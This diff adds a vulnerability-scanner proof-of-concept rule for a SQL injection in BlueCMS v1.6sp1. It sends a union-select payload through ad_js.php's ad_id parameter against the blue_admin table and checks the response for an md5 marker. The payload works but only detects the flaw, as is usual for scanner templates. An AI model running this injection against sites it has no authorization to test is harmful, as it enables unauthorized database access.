@@ -1,0 +1,9 @@
+name: poc-yaml-BlueCMSv1.6sp1-SQL.yml
+rules:
+  - method: GET
+    path: /ad_js.php?ad_id=1 and 1=2 union select 1,2,3,4,5,6,concat(1,(md5(99999999)),1) from blue_admin where admin_id=1
+    expression: response.status==200 && response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
+
+detail:
+  author: Facker007(https://github.com/Facker007)
+  links: https://www.cnblogs.com/Hi-blog/p/7990894.html
